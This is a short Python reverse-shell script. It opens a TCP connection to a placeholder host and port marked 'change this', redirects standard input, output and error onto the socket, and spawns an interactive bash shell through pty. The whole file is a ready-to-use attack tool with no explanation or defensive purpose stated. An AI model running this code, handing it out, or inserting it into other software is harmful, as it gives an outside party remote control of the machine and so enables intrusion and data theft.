#!/usr/bin/env python3
import socket, subprocess, os, pty

HOST = "127.0.0.1"   # change this
PORT = 4466          # change this

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/bash")
